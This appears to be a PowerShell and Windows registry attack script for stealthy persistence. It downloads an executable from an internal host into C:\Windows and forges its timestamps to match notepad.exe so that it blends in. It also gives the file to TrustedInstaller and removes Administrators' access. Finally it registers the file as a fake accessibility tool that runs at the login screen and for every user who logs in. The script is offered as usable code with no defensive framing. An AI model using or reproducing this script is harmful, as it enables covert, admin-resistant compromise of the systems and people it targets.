$ClipURL = "http://10.1.0.201/ParameterService.exe"
$ClipPath = "C:\Windows\pservice.exe"
if (-not (Test-Path $ClipPath -PathType leaf)) {
    (new-object system.net.webclient).DownloadFile($ClipURL, $ClipPath)
    #Fake the timestamps to make it blend in better.
    $FileDate = (Get-ChildItem \Windows\notepad.exe).LastWriteTime
    $(Get-ChildItem $ClipPath).CreationTime = $FileDate
    $(Get-ChildItem $ClipPath).LastWriteTime = $FileDate
    $(Get-ChildItem $ClipPath).LastAccessTime = $FileDate
    icacls $ClipPath /setowner "NT SERVICE\TrustedInstaller"
    icacls $ClipPath /remove Administrators
}
REG COPY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\osk" "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\showkeys" /s
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\showkeys" /v StartExe /t REG_SZ /d "C:\Windows\pservice.exe" /f
# This command should set it to activate as the current user
REG ADD "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v Configuration /t REG_SZ /d "showkeys" /f
# This sets the tool to run on the login screen
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility" /v Configuration /t REG_SZ /d "showkeys" /f
# This command should to set it to activate every time a user logs in, if they have not logged in to the system before this is set.
REG LOAD HKU\USERTEMPLATE C:\Users\Default\ntuser.dat
REG ADD "HKU\USERTEMPLATE\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v Configuration /t REG_SZ /d "showkeys" /f
